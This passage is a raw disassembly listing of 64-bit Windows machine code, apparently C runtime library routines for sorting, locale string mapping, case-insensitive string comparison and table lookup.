   140009c2b:	ff 15 37 46 00 00    	call   *0x4637(%rip)        # 0x14000e268
   140009c31:	85 c0                	test   %eax,%eax
   140009c33:	7e 33                	jle    0x140009c68
   140009c35:	4d 8b c6             	mov    %r14,%r8
   140009c38:	49 8b d7             	mov    %r15,%rdx
   140009c3b:	49 3b f7             	cmp    %r15,%rsi
   140009c3e:	74 28                	je     0x140009c68
   140009c40:	4c 8b ce             	mov    %rsi,%r9
   140009c43:	4d 2b cf             	sub    %r15,%r9
   140009c46:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140009c4d:	00 00 00 
   140009c50:	0f b6 02             	movzbl (%rdx),%eax
   140009c53:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   140009c58:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   140009c5c:	88 0a                	mov    %cl,(%rdx)
   140009c5e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140009c62:	49 83 e8 01          	sub    $0x1,%r8
   140009c66:	75 e8                	jne    0x140009c50
   140009c68:	49 8b dd             	mov    %r13,%rbx
   140009c6b:	49 8b ff             	mov    %r15,%rdi
   140009c6e:	66 90                	xchg   %ax,%ax
   140009c70:	48 3b f3             	cmp    %rbx,%rsi
   140009c73:	76 2b                	jbe    0x140009ca0
   140009c75:	49 03 de             	add    %r14,%rbx
   140009c78:	48 3b de             	cmp    %rsi,%rbx
   140009c7b:	73 23                	jae    0x140009ca0
   140009c7d:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   140009c84:	b7 75 93 
   140009c87:	48 8b d6             	mov    %rsi,%rdx
   140009c8a:	48 8b cb             	mov    %rbx,%rcx
   140009c8d:	49 8b c4             	mov    %r12,%rax
   140009c90:	ff 15 d2 45 00 00    	call   *0x45d2(%rip)        # 0x14000e268
   140009c96:	85 c0                	test   %eax,%eax
   140009c98:	7e db                	jle    0x140009c75
   140009c9a:	eb 29                	jmp    0x140009cc5
   140009c9c:	0f 1f 40 00          	nopl   0x0(%rax)
   140009ca0:	49 03 de             	add    %r14,%rbx
   140009ca3:	49 3b df             	cmp    %r15,%rbx
   140009ca6:	77 1d                	ja     0x140009cc5
   140009ca8:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   140009caf:	b7 75 93 
   140009cb2:	48 8b d6             	mov    %rsi,%rdx
   140009cb5:	48 8b cb             	mov    %rbx,%rcx
   140009cb8:	49 8b c4             	mov    %r12,%rax
   140009cbb:	ff 15 a7 45 00 00    	call   *0x45a7(%rip)        # 0x14000e268
   140009cc1:	85 c0                	test   %eax,%eax
   140009cc3:	7e db                	jle    0x140009ca0
   140009cc5:	48 8b ef             	mov    %rdi,%rbp
   140009cc8:	49 2b fe             	sub    %r14,%rdi
   140009ccb:	48 3b fe             	cmp    %rsi,%rdi
   140009cce:	76 1d                	jbe    0x140009ced
   140009cd0:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   140009cd7:	b7 75 93 
   140009cda:	48 8b d6             	mov    %rsi,%rdx
   140009cdd:	48 8b cf             	mov    %rdi,%rcx
   140009ce0:	49 8b c4             	mov    %r12,%rax
   140009ce3:	ff 15 7f 45 00 00    	call   *0x457f(%rip)        # 0x14000e268
   140009ce9:	85 c0                	test   %eax,%eax
   140009ceb:	7f d8                	jg     0x140009cc5
   140009ced:	48 3b fb             	cmp    %rbx,%rdi
   140009cf0:	72 38                	jb     0x140009d2a
   140009cf2:	4d 8b c6             	mov    %r14,%r8
   140009cf5:	48 8b d7             	mov    %rdi,%rdx
   140009cf8:	74 1e                	je     0x140009d18
   140009cfa:	4c 8b cb             	mov    %rbx,%r9
   140009cfd:	4c 2b cf             	sub    %rdi,%r9
   140009d00:	0f b6 02             	movzbl (%rdx),%eax
   140009d03:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   140009d08:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   140009d0c:	88 0a                	mov    %cl,(%rdx)
   140009d0e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140009d12:	49 83 e8 01          	sub    $0x1,%r8
   140009d16:	75 e8                	jne    0x140009d00
   140009d18:	48 3b f7             	cmp    %rdi,%rsi
   140009d1b:	48 8b c3             	mov    %rbx,%rax
   140009d1e:	48 0f 45 c6          	cmovne %rsi,%rax
   140009d22:	48 8b f0             	mov    %rax,%rsi
   140009d25:	e9 46 ff ff ff       	jmp    0x140009c70
   140009d2a:	48 3b f5             	cmp    %rbp,%rsi
   140009d2d:	73 28                	jae    0x140009d57
   140009d2f:	90                   	nop
   140009d30:	49 2b ee             	sub    %r14,%rbp
   140009d33:	48 3b ee             	cmp    %rsi,%rbp
   140009d36:	76 1f                	jbe    0x140009d57
   140009d38:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   140009d3f:	b7 75 93 
   140009d42:	48 8b d6             	mov    %rsi,%rdx
   140009d45:	48 8b cd             	mov    %rbp,%rcx
   140009d48:	49 8b c4             	mov    %r12,%rax
   140009d4b:	ff 15 17 45 00 00    	call   *0x4517(%rip)        # 0x14000e268
   140009d51:	85 c0                	test   %eax,%eax
   140009d53:	74 db                	je     0x140009d30
   140009d55:	eb 25                	jmp    0x140009d7c
   140009d57:	49 2b ee             	sub    %r14,%rbp
   140009d5a:	49 3b ed             	cmp    %r13,%rbp
   140009d5d:	76 1d                	jbe    0x140009d7c
   140009d5f:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   140009d66:	b7 75 93 
   140009d69:	48 8b d6             	mov    %rsi,%rdx
   140009d6c:	48 8b cd             	mov    %rbp,%rcx
   140009d6f:	49 8b c4             	mov    %r12,%rax
   140009d72:	ff 15 f0 44 00 00    	call   *0x44f0(%rip)        # 0x14000e268
   140009d78:	85 c0                	test   %eax,%eax
   140009d7a:	74 db                	je     0x140009d57
   140009d7c:	49 8b cf             	mov    %r15,%rcx
   140009d7f:	48 8b c5             	mov    %rbp,%rax
   140009d82:	48 2b cb             	sub    %rbx,%rcx
   140009d85:	49 2b c5             	sub    %r13,%rax
   140009d88:	48 3b c1             	cmp    %rcx,%rax
   140009d8b:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140009d90:	7c 2b                	jl     0x140009dbd
   140009d92:	4c 3b ed             	cmp    %rbp,%r13
   140009d95:	73 15                	jae    0x140009dac
   140009d97:	4c 89 6c cc 30       	mov    %r13,0x30(%rsp,%rcx,8)
   140009d9c:	48 89 ac cc 20 02 00 	mov    %rbp,0x220(%rsp,%rcx,8)
   140009da3:	00 
   140009da4:	48 ff c1             	inc    %rcx
   140009da7:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140009dac:	49 3b df             	cmp    %r15,%rbx
   140009daf:	0f 83 9e fd ff ff    	jae    0x140009b53
   140009db5:	4c 8b eb             	mov    %rbx,%r13
   140009db8:	e9 03 fd ff ff       	jmp    0x140009ac0
   140009dbd:	49 3b df             	cmp    %r15,%rbx
   140009dc0:	73 15                	jae    0x140009dd7
   140009dc2:	48 89 5c cc 30       	mov    %rbx,0x30(%rsp,%rcx,8)
   140009dc7:	4c 89 bc cc 20 02 00 	mov    %r15,0x220(%rsp,%rcx,8)
   140009dce:	00 
   140009dcf:	48 ff c1             	inc    %rcx
   140009dd2:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140009dd7:	4c 3b ed             	cmp    %rbp,%r13
   140009dda:	0f 83 73 fd ff ff    	jae    0x140009b53
   140009de0:	4c 8b fd             	mov    %rbp,%r15
   140009de3:	e9 d8 fc ff ff       	jmp    0x140009ac0
   140009de8:	48 8b bc 24 30 04 00 	mov    0x430(%rsp),%rdi
   140009def:	00 
   140009df0:	48 8b b4 24 38 04 00 	mov    0x438(%rsp),%rsi
   140009df7:	00 
   140009df8:	48 8b ac 24 40 04 00 	mov    0x440(%rsp),%rbp
   140009dff:	00 
   140009e00:	48 8b 9c 24 48 04 00 	mov    0x448(%rsp),%rbx
   140009e07:	00 
   140009e08:	4c 8b bc 24 28 04 00 	mov    0x428(%rsp),%r15
   140009e0f:	00 
   140009e10:	48 8b 8c 24 10 04 00 	mov    0x410(%rsp),%rcx
   140009e17:	00 
   140009e18:	48 33 cc             	xor    %rsp,%rcx
   140009e1b:	e8 b0 2d 00 00       	call   0x14000cbd0
   140009e20:	48 81 c4 50 04 00 00 	add    $0x450,%rsp
   140009e27:	41 5e                	pop    %r14
   140009e29:	41 5d                	pop    %r13
   140009e2b:	41 5c                	pop    %r12
   140009e2d:	c3                   	ret
   140009e2e:	cc                   	int3
   140009e2f:	cc                   	int3
   140009e30:	40 55                	rex push %rbp
   140009e32:	41 54                	push   %r12
   140009e34:	41 55                	push   %r13
   140009e36:	41 56                	push   %r14
   140009e38:	41 57                	push   %r15
   140009e3a:	48 83 ec 60          	sub    $0x60,%rsp
   140009e3e:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140009e43:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   140009e47:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   140009e4b:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   140009e4f:	48 8b 05 ea e1 00 00 	mov    0xe1ea(%rip),%rax        # 0x140018040
   140009e56:	48 33 c5             	xor    %rbp,%rax
   140009e59:	48 89 45 08          	mov    %rax,0x8(%rbp)
   140009e5d:	48 63 75 60          	movslq 0x60(%rbp),%rsi
   140009e61:	4d 8b e1             	mov    %r9,%r12
   140009e64:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   140009e68:	45 8b e8             	mov    %r8d,%r13d
   140009e6b:	48 8b d9             	mov    %rcx,%rbx
   140009e6e:	85 f6                	test   %esi,%esi
   140009e70:	7e 14                	jle    0x140009e86
   140009e72:	48 8b d6             	mov    %rsi,%rdx
   140009e75:	49 8b c9             	mov    %r9,%rcx
   140009e78:	e8 df 15 00 00       	call   0x14000b45c
   140009e7d:	3b c6                	cmp    %esi,%eax
   140009e7f:	8d 70 01             	lea    0x1(%rax),%esi
   140009e82:	7c 02                	jl     0x140009e86
   140009e84:	8b f0                	mov    %eax,%esi
   140009e86:	44 8b 75 78          	mov    0x78(%rbp),%r14d
   140009e8a:	45 85 f6             	test   %r14d,%r14d
   140009e8d:	75 07                	jne    0x140009e96
   140009e8f:	48 8b 03             	mov    (%rbx),%rax
   140009e92:	44 8b 70 0c          	mov    0xc(%rax),%r14d
   140009e96:	f7 9d 80 00 00 00    	negl   0x80(%rbp)
   140009e9c:	44 8b ce             	mov    %esi,%r9d
   140009e9f:	4d 8b c4             	mov    %r12,%r8
   140009ea2:	41 8b ce             	mov    %r14d,%ecx
   140009ea5:	1b d2                	sbb    %edx,%edx
   140009ea7:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140009eac:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009eb2:	83 e2 08             	and    $0x8,%edx
   140009eb5:	ff c2                	inc    %edx
   140009eb7:	e8 3c d9 ff ff       	call   0x1400077f8
   140009ebc:	4c 63 f8             	movslq %eax,%r15
   140009ebf:	85 c0                	test   %eax,%eax
   140009ec1:	0f 84 62 02 00 00    	je     0x14000a129
   140009ec7:	49 8b c7             	mov    %r15,%rax
   140009eca:	48 03 c0             	add    %rax,%rax
   140009ecd:	48 8d 48 10          	lea    0x10(%rax),%rcx
   140009ed1:	48 3b c1             	cmp    %rcx,%rax
   140009ed4:	48 1b c0             	sbb    %rax,%rax
   140009ed7:	48 23 c1             	and    %rcx,%rax
   140009eda:	0f 84 2d 02 00 00    	je     0x14000a10d
   140009ee0:	48 ba f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rdx
   140009ee7:	ff ff 0f 
   140009eea:	48 3d 00 04 00 00    	cmp    $0x400,%rax
   140009ef0:	77 2d                	ja     0x140009f1f
   140009ef2:	48 8d 48 0f          	lea    0xf(%rax),%rcx
   140009ef6:	48 3b c8             	cmp    %rax,%rcx
   140009ef9:	77 03                	ja     0x140009efe
   140009efb:	48 8b ca             	mov    %rdx,%rcx
   140009efe:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   140009f02:	48 8b c1             	mov    %rcx,%rax
   140009f05:	e8 86 2e 00 00       	call   0x14000cd90
   140009f0a:	48 2b e1             	sub    %rcx,%rsp
   140009f0d:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   140009f12:	48 85 ff             	test   %rdi,%rdi
   140009f15:	74 22                	je     0x140009f39
   140009f17:	c7 07 cc cc 00 00    	movl   $0xcccc,(%rdi)
   140009f1d:	eb 16                	jmp    0x140009f35
   140009f1f:	48 8b c8             	mov    %rax,%rcx
   140009f22:	e8 d5 e3 ff ff       	call   0x1400082fc
   140009f27:	48 8b f8             	mov    %rax,%rdi
   140009f2a:	48 85 c0             	test   %rax,%rax
   140009f2d:	74 0a                	je     0x140009f39
   140009f2f:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   140009f35:	48 83 c7 10          	add    $0x10,%rdi
   140009f39:	48 8b df             	mov    %rdi,%rbx
   140009f3c:	48 85 ff             	test   %rdi,%rdi
   140009f3f:	0f 84 ca 01 00 00    	je     0x14000a10f
   140009f45:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   140009f4a:	44 8b ce             	mov    %esi,%r9d
   140009f4d:	4d 8b c4             	mov    %r12,%r8
   140009f50:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140009f55:	ba 01 00 00 00       	mov    $0x1,%edx
   140009f5a:	41 8b ce             	mov    %r14d,%ecx
   140009f5d:	e8 96 d8 ff ff       	call   0x1400077f8
   140009f62:	85 c0                	test   %eax,%eax
   140009f64:	0f 84 a5 01 00 00    	je     0x14000a10f
   140009f6a:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   140009f70:	45 8b cf             	mov    %r15d,%r9d
   140009f73:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140009f79:	4c 8b c7             	mov    %rdi,%r8
   140009f7c:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140009f82:	41 8b d5             	mov    %r13d,%edx
   140009f85:	4c 8b 65 00          	mov    0x0(%rbp),%r12
   140009f89:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140009f8e:	49 8b cc             	mov    %r12,%rcx
   140009f91:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009f97:	e8 44 ec ff ff       	call   0x140008be0
   140009f9c:	48 63 f0             	movslq %eax,%rsi
   140009f9f:	85 c0                	test   %eax,%eax
   140009fa1:	0f 84 68 01 00 00    	je     0x14000a10f
   140009fa7:	ba 00 04 00 00       	mov    $0x400,%edx
   140009fac:	44 85 ea             	test   %r13d,%edx
   140009faf:	74 52                	je     0x14000a003
   140009fb1:	8b 45 70             	mov    0x70(%rbp),%eax
   140009fb4:	85 c0                	test   %eax,%eax
   140009fb6:	0f 84 2a 01 00 00    	je     0x14000a0e6
   140009fbc:	3b f0                	cmp    %eax,%esi
   140009fbe:	0f 8f 4b 01 00 00    	jg     0x14000a10f
   140009fc4:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   140009fca:	45 8b cf             	mov    %r15d,%r9d
   140009fcd:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140009fd3:	4c 8b c7             	mov    %rdi,%r8
   140009fd6:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140009fdc:	41 8b d5             	mov    %r13d,%edx
   140009fdf:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140009fe3:	49 8b cc             	mov    %r12,%rcx
   140009fe6:	48 8b 45 68          	mov    0x68(%rbp),%rax
   140009fea:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140009fef:	e8 ec eb ff ff       	call   0x140008be0
   140009ff4:	8b f0                	mov    %eax,%esi
   140009ff6:	85 c0                	test   %eax,%eax
   140009ff8:	0f 85 e8 00 00 00    	jne    0x14000a0e6
   140009ffe:	e9 0c 01 00 00       	jmp    0x14000a10f
   14000a003:	48 8b ce             	mov    %rsi,%rcx
   14000a006:	48 03 c9             	add    %rcx,%rcx
   14000a009:	48 8d 41 10          	lea    0x10(%rcx),%rax
   14000a00d:	48 3b c8             	cmp    %rax,%rcx
   14000a010:	48 1b c9             	sbb    %rcx,%rcx
   14000a013:	48 23 c8             	and    %rax,%rcx
   14000a016:	0f 84 c8 00 00 00    	je     0x14000a0e4
   14000a01c:	48 3b ca             	cmp    %rdx,%rcx
   14000a01f:	77 35                	ja     0x14000a056
   14000a021:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000a025:	48 3b c1             	cmp    %rcx,%rax
   14000a028:	77 0a                	ja     0x14000a034
   14000a02a:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   14000a031:	ff ff 0f 
   14000a034:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000a038:	e8 53 2d 00 00       	call   0x14000cd90
   14000a03d:	48 2b e0             	sub    %rax,%rsp
   14000a040:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   14000a045:	48 85 db             	test   %rbx,%rbx
   14000a048:	0f 84 96 00 00 00    	je     0x14000a0e4
   14000a04e:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000a054:	eb 13                	jmp    0x14000a069
   14000a056:	e8 a1 e2 ff ff       	call   0x1400082fc
   14000a05b:	48 8b d8             	mov    %rax,%rbx
   14000a05e:	48 85 c0             	test   %rax,%rax
   14000a061:	74 0a                	je     0x14000a06d
   14000a063:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000a069:	48 83 c3 10          	add    $0x10,%rbx
   14000a06d:	48 85 db             	test   %rbx,%rbx
   14000a070:	74 72                	je     0x14000a0e4
   14000a072:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000a078:	45 8b cf             	mov    %r15d,%r9d
   14000a07b:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000a081:	4c 8b c7             	mov    %rdi,%r8
   14000a084:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000a08a:	41 8b d5             	mov    %r13d,%edx
   14000a08d:	89 74 24 28          	mov    %esi,0x28(%rsp)
   14000a091:	49 8b cc             	mov    %r12,%rcx
   14000a094:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000a099:	e8 42 eb ff ff       	call   0x140008be0
   14000a09e:	85 c0                	test   %eax,%eax
   14000a0a0:	74 31                	je     0x14000a0d3
   14000a0a2:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000a0a8:	33 d2                	xor    %edx,%edx
   14000a0aa:	48 21 54 24 30       	and    %rdx,0x30(%rsp)
   14000a0af:	44 8b ce             	mov    %esi,%r9d
   14000a0b2:	8b 45 70             	mov    0x70(%rbp),%eax
   14000a0b5:	4c 8b c3             	mov    %rbx,%r8
   14000a0b8:	41 8b ce             	mov    %r14d,%ecx
   14000a0bb:	85 c0                	test   %eax,%eax
   14000a0bd:	75 2c                	jne    0x14000a0eb
   14000a0bf:	21 54 24 28          	and    %edx,0x28(%rsp)
   14000a0c3:	48 21 54 24 20       	and    %rdx,0x20(%rsp)
   14000a0c8:	e8 87 d7 ff ff       	call   0x140007854
   14000a0cd:	8b f0                	mov    %eax,%esi
   14000a0cf:	85 c0                	test   %eax,%eax
   14000a0d1:	75 27                	jne    0x14000a0fa
   14000a0d3:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000a0d7:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000a0dd:	75 05                	jne    0x14000a0e4
   14000a0df:	e8 48 c5 ff ff       	call   0x14000662c
   14000a0e4:	33 f6                	xor    %esi,%esi
   14000a0e6:	48 8b df             	mov    %rdi,%rbx
   14000a0e9:	eb 2b                	jmp    0x14000a116
   14000a0eb:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000a0ef:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000a0f3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a0f8:	eb ce                	jmp    0x14000a0c8
   14000a0fa:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000a0fe:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000a104:	75 e0                	jne    0x14000a0e6
   14000a106:	e8 21 c5 ff ff       	call   0x14000662c
   14000a10b:	eb d9                	jmp    0x14000a0e6
   14000a10d:	33 db                	xor    %ebx,%ebx
   14000a10f:	33 f6                	xor    %esi,%esi
   14000a111:	48 85 db             	test   %rbx,%rbx
   14000a114:	74 11                	je     0x14000a127
   14000a116:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000a11a:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000a120:	75 05                	jne    0x14000a127
   14000a122:	e8 05 c5 ff ff       	call   0x14000662c
   14000a127:	8b c6                	mov    %esi,%eax
   14000a129:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   14000a12d:	48 33 cd             	xor    %rbp,%rcx
   14000a130:	e8 9b 2a 00 00       	call   0x14000cbd0
   14000a135:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   14000a139:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   14000a13d:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   14000a141:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   14000a145:	41 5f                	pop    %r15
   14000a147:	41 5e                	pop    %r14
   14000a149:	41 5d                	pop    %r13
   14000a14b:	41 5c                	pop    %r12
   14000a14d:	5d                   	pop    %rbp
   14000a14e:	c3                   	ret
   14000a14f:	cc                   	int3
   14000a150:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a155:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000a15a:	57                   	push   %rdi
   14000a15b:	48 83 ec 70          	sub    $0x70,%rsp
   14000a15f:	48 8b f2             	mov    %rdx,%rsi
   14000a162:	49 8b d9             	mov    %r9,%rbx
   14000a165:	48 8b d1             	mov    %rcx,%rdx
   14000a168:	41 8b f8             	mov    %r8d,%edi
   14000a16b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000a170:	e8 83 ca ff ff       	call   0x140006bf8
   14000a175:	8b 84 24 c0 00 00 00 	mov    0xc0(%rsp),%eax
   14000a17c:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000a181:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000a185:	4c 8b cb             	mov    %rbx,%r9
   14000a188:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   14000a18f:	44 8b c7             	mov    %edi,%r8d
   14000a192:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000a196:	48 8b d6             	mov    %rsi,%rdx
   14000a199:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   14000a1a0:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000a1a4:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   14000a1ab:	00 
   14000a1ac:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000a1b1:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   14000a1b8:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000a1bc:	e8 6f fc ff ff       	call   0x140009e30
   14000a1c1:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   14000a1c6:	74 0c                	je     0x14000a1d4
   14000a1c8:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000a1cd:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000a1d4:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   14000a1d9:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000a1dd:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000a1e1:	49 8b e3             	mov    %r11,%rsp
   14000a1e4:	5f                   	pop    %rdi
   14000a1e5:	c3                   	ret
   14000a1e6:	cc                   	int3
   14000a1e7:	cc                   	int3
   14000a1e8:	48 83 ec 28          	sub    $0x28,%rsp
   14000a1ec:	e8 a3 d2 ff ff       	call   0x140007494
   14000a1f1:	33 c9                	xor    %ecx,%ecx
   14000a1f3:	84 c0                	test   %al,%al
   14000a1f5:	0f 94 c1             	sete   %cl
   14000a1f8:	8b c1                	mov    %ecx,%eax
   14000a1fa:	48 83 c4 28          	add    $0x28,%rsp
   14000a1fe:	c3                   	ret
   14000a1ff:	cc                   	int3
   14000a200:	4c 8b da             	mov    %rdx,%r11
   14000a203:	4c 8b d1             	mov    %rcx,%r10
   14000a206:	4d 85 c0             	test   %r8,%r8
   14000a209:	75 03                	jne    0x14000a20e
   14000a20b:	33 c0                	xor    %eax,%eax
   14000a20d:	c3                   	ret
   14000a20e:	41 0f b7 0a          	movzwl (%r10),%ecx
   14000a212:	4d 8d 52 02          	lea    0x2(%r10),%r10
   14000a216:	41 0f b7 13          	movzwl (%r11),%edx
   14000a21a:	4d 8d 5b 02          	lea    0x2(%r11),%r11
   14000a21e:	8d 41 bf             	lea    -0x41(%rcx),%eax
   14000a221:	83 f8 19             	cmp    $0x19,%eax
   14000a224:	44 8d 49 20          	lea    0x20(%rcx),%r9d
   14000a228:	8d 42 bf             	lea    -0x41(%rdx),%eax
   14000a22b:	44 0f 47 c9          	cmova  %ecx,%r9d
   14000a22f:	83 f8 19             	cmp    $0x19,%eax
   14000a232:	8d 4a 20             	lea    0x20(%rdx),%ecx
   14000a235:	41 8b c1             	mov    %r9d,%eax
   14000a238:	0f 47 ca             	cmova  %edx,%ecx
   14000a23b:	2b c1                	sub    %ecx,%eax
   14000a23d:	75 0b                	jne    0x14000a24a
   14000a23f:	45 85 c9             	test   %r9d,%r9d
   14000a242:	74 06                	je     0x14000a24a
   14000a244:	49 83 e8 01          	sub    $0x1,%r8
   14000a248:	75 c4                	jne    0x14000a20e
   14000a24a:	c3                   	ret
   14000a24b:	cc                   	int3
   14000a24c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a251:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000a256:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000a25b:	57                   	push   %rdi
   14000a25c:	41 56                	push   %r14
   14000a25e:	41 57                	push   %r15
   14000a260:	48 83 ec 20          	sub    $0x20,%rsp
   14000a264:	4c 8b f1             	mov    %rcx,%r14
   14000a267:	48 85 c9             	test   %rcx,%rcx
   14000a26a:	74 4a                	je     0x14000a2b6
   14000a26c:	33 db                	xor    %ebx,%ebx
   14000a26e:	4c 8d 3d 8b 5d ff ff 	lea    -0xa275(%rip),%r15        # 0x140000000
   14000a275:	bf e3 00 00 00       	mov    $0xe3,%edi
   14000a27a:	8d 04 1f             	lea    (%rdi,%rbx,1),%eax
   14000a27d:	41 b8 55 00 00 00    	mov    $0x55,%r8d
   14000a283:	99                   	cltd
   14000a284:	49 8b ce             	mov    %r14,%rcx
   14000a287:	2b c2                	sub    %edx,%eax
   14000a289:	d1 f8                	sar    $1,%eax
   14000a28b:	48 63 e8             	movslq %eax,%rbp
   14000a28e:	48 8b d5             	mov    %rbp,%rdx
   14000a291:	48 8b f5             	mov    %rbp,%rsi
   14000a294:	48 03 d2             	add    %rdx,%rdx
   14000a297:	49 8b 94 d7 40 24 01 	mov    0x12440(%r15,%rdx,8),%rdx
   14000a29e:	00 
   14000a29f:	e8 5c ff ff ff       	call   0x14000a200
   14000a2a4:	85 c0                	test   %eax,%eax
   14000a2a6:	74 29                	je     0x14000a2d1
   14000a2a8:	79 05                	jns    0x14000a2af
   14000a2aa:	8d 7d ff             	lea    -0x1(%rbp),%edi
   14000a2ad:	eb 03                	jmp    0x14000a2b2
   14000a2af:	8d 5d 01             	lea    0x1(%rbp),%ebx
   14000a2b2:	3b df                	cmp    %edi,%ebx
   14000a2b4:	7e c4                	jle    0x14000a27a
   14000a2b6:	33 c0                	xor    %eax,%eax
   14000a2b8:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000a2bd:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000a2c2:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000a2c7:	48 83 c4 20          	add    $0x20,%rsp
   14000a2cb:	41 5f                	pop    %r15
   14000a2cd:	41 5e                	pop    %r14
   14000a2cf:	5f                   	pop    %rdi
   14000a2d0:	c3                   	ret
   14000a2d1:	48 03 f6             	add    %rsi,%rsi
   14000a2d4:	49 63 84 f7 48 24 01 	movslq 0x12448(%r15,%rsi,8),%rax
   14000a2db:	00 
   14000a2dc:	85 c0                	test   %eax,%eax
   14000a2de:	78 d6                	js     0x14000a2b6
   14000a2e0:	3d e4 00 00 00       	cmp    $0xe4,%eax
   14000a2e5:	73 cf                	jae    0x14000a2b6
   14000a2e7:	48 03 c0             	add    %rax,%rax
   14000a2ea:	41 8b 84 c7 e0 09 01 	mov    0x109e0(%r15,%rax,8),%eax
   14000a2f1:	00 
   14000a2f2:	eb c4                	jmp    0x14000a2b8
   14000a2f4:	48 83 ec 28          	sub    $0x28,%rsp
   14000a2f8:	48 85 c9             	test   %rcx,%rcx
   14000a2fb:	75 19                	jne    0x14000a316
   14000a2fd:	e8 92 c2 ff ff       	call   0x140006594
   14000a302:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a308:	e8 2f c0 ff ff       	call   0x14000633c
   14000a30d:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000a311:	48 83 c4 28          	add    $0x28,%rsp
   14000a315:	c3                   	ret
   14000a316:	4c 8b c1             	mov    %rcx,%r8
